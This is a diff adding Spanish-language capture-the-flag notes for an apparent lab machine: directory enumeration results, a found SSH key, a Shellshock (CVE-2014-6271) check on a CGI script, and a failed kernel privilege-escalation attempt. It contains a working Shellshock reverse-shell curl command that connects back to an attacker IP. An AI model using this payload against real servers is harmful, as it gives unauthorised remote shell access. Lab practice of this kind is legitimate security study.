@@ -1,0 +1,38 @@
+root subdirectories
+	/index.html           (Status: 200) [Size: 3025]
+	/img                  (Status: 301) [Size: 309] [--> http://10.10.236.97/img/]
+	/cgi-bin              (Status: 301) [Size: 313] [--> http://10.10.236.97/cgi-bin/]
+	/uploads              (Status: 301) [Size: 313] [--> http://10.10.236.97/uploads/]
+	/admin                (Status: 301) [Size: 311] [--> http://10.10.236.97/admin/]  
+	/css                  (Status: 301) [Size: 309] [--> http://10.10.236.97/css/]    
+	/js                   (Status: 301) [Size: 308] [--> http://10.10.236.97/js/]     
+	/backup               (Status: 301) [Size: 312] [--> http://10.10.236.97/backup/] 
+	/robots.txt           (Status: 200) [Size: 38]                                    
+	/secret               (Status: 301) [Size: 312] [--> http://10.10.236.97/secret/] 
+
+/robots es un trolleo
+/backup es una id_rsa de a saber quien, la guardo en unknow_id_rsa
+/js y /css no tienen nada
+/img tiene una imagen (stego??)
+/uploads, /secret y /admin no he descubierto nada por ahora
+/cgi-bin es una carpeta que se suele usar para guardar archivos .cgi, encontramos test.cgi
+
+
+usando gobuster en /cgi-bin, añadiendo la extensión ".cgi" descubrimos "test.cgi"
+hay una vulnerabilidad llamada "Shellshock" que te permite RCE a través de los parámetros que recogen los archivos ".cgi"
+buscamos la vulnerabilidad con el siguiente comando
+nmap $target -p 80 --script=http-shellshock --script-args uri=/cgi-bin/test.cgi
+indica que posiblemente sea vulnerable
+es el CVE-2014-6271
+
+comando para conseguir reverse shell
+curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.9.2.82/443 0>&1" http://$target/cgi-bin/test.cgi
+
+ya somos www-data, hay un suid que es pt_chown que parece vulnerable
+miento, parece que es vulnerable la versión de Kernel Linux ubuntu 3.13.0-32-generic
+parece que el comando gcc no funciona, y eso me está impidiendo explotar la vulnerabilidad
+
+el error que da es 'gcc: error trying to exec 'cc1': execvp: No such file or directory'
+las ideas que tengo son : usar un gcc portable, o instalar la libreria que falta
+
+el usuario es ryan, y la passphrase de la id_rsa que encontramos previamente es 'letmein', pero parece que no funciona
